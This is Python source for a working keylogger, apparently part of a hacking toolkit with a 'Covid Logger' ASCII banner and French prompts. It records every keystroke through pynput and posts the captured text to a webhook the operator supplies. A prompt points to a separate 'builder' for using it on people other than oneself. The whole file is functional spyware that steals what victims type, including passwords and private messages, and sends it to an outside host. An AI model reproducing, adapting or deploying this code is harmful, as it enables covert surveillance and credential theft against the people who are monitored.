import os
import time
import requests
import json
import threading
from code.colors import BLUE


def keylogger():
    try:
        from pynput import keyboard
    except ImportError:
        print("Error: 'pynput' package is required for keylogger.")
        print("Install it with: pip install pynput")
        time.sleep(5)
        return
    os.system("cls")
    webhook_choice = input(f"""{BLUE}

                ▄████▄   ▒█████   ██▒   █▓ ██▓▓█████▄     ██▓     ▒█████    ▄████ ▓█████  ██▀███
                ▒██▀ ▀█  ▒██▒  ██▒▓██░   █▒▓██▒▒██▀ ██▌   ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
                ▒▓█    ▄ ▒██░  ██▒ ▓██  █▒░▒██▒░██   █▌   ▒██░    ▒██░  ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
                ▒▓▓▄ ▄██▒▒██   ██░  ▒██ █░░░██░░▓█▄   ▌   ▒██░    ▒██   ██░░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄
                ▒ ▓███▀ ░░ ████▓▒░   ▒▀█░  ░██░░▒████▓    ░██████▒░ ████▓▒░░▒▓███▀▒░▒████▒░██▓ ▒██▒
                ░ ░▒ ▒  ░░ ▒░▒░▒░    ░ ▐░  ░▓   ▒▒▓  ▒    ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
                ░  ▒     ░ ▒ ▒░    ░ ░░   ▒ ░ ░ ▒  ▒    ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
                ░        ░ ░ ░ ▒       ░░   ▒ ░ ░ ░  ░      ░ ░   ░ ░ ░ ▒  ░ ░   ░    ░     ░░   ░
                ░ ░          ░ ░        ░   ░     ░           ░  ░    ░ ░        ░    ░  ░   ░
                ░                      ░        ░
                            {BLUE}
                Met ton webhook (Pour tester sur des gens autre que vous allez sur le covid builder): """)
    os.system("cls")

    webhook = webhook_choice
    buffer = ""
    timer = None

    def send_buffer():
        nonlocal buffer
        if buffer:
            data = {
                "content": buffer,
                "username": "WhiteWolf",
                "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
            }
            requests.post(webhook, json=data)
            buffer = ""

    def reset_timer():
        nonlocal timer
        if timer:
            timer.cancel()
        timer = threading.Timer(1.0, send_buffer)
        timer.start()

    def on_press(key):
        nonlocal buffer
        try:
            char = key.char
            buffer += char
        except AttributeError:
            if key == keyboard.Key.space:
                buffer += " "
            elif key == keyboard.Key.enter:
                buffer += "\n"
        reset_timer()

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()
